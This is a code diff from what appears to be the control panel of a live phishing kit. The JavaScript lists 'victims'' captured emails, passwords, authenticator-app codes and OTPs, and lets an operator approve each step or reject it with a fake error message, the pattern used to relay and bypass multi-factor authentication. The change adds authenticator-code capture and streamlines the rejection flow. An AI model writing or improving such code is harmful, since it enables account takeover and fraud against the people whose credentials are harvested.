@@ -590,7 +590,7 @@ function displayVictimInfo(victimInfos) {
     
     victimInfos.forEach((victim, index) => {
         const isLatest = index === 0;
-        const hasData = victim.login_email || victim.login_password || victim.login_otp;
+        const hasData = victim.login_email || victim.login_password || victim.login_authenticator_app_code || victim.login_otp;
         
         if (!hasData) return; // Skip empty entries
         
@@ -793,47 +793,18 @@ function approveSubmission(victimId, step) {
     });
 }
 
-// Function to reject a submission - removed duplicate
-
-// Function to approve a submission
-function approveSubmission(victimId, step) {
-    const url = `/approve/${victimId}/`;
-    
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'X-CSRFToken': getCookie('csrftoken')
-        },
-        body: JSON.stringify({
-            step: step
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === 'success') {
-            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} approved successfully!`, 'success');
-            updateVictimInfo(); // Refresh the display
-        } else {
-            showNotification('Failed to approve submission', 'danger');
-        }
-    })
-    .catch(error => {
-        console.error('Error approving submission:', error);
-        showNotification('Failed to approve submission', 'danger');
-    });
-}
-
 // Function to reject a submission
 function rejectSubmission(victimId, step) {
-    // Show custom error message input
-    const errorMessage = prompt(`Enter error message for ${step}:`, getDefaultErrorMessage(step));
+    const errorMessages = {
+        'email': 'Invalid email address',
+        'password': 'Incorrect password',
+        'authenticator': 'Invalid authenticator code',
+        'otp': 'Invalid OTP code'
+    };
     
-    if (errorMessage === null) return; // User cancelled
+    const errorMessage = errorMessages[step] || 'Invalid information provided';
     
-    const url = `/reject/${victimId}/`;
-    
-    fetch(url, {
+    fetch(`/reject/${victimId}/`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
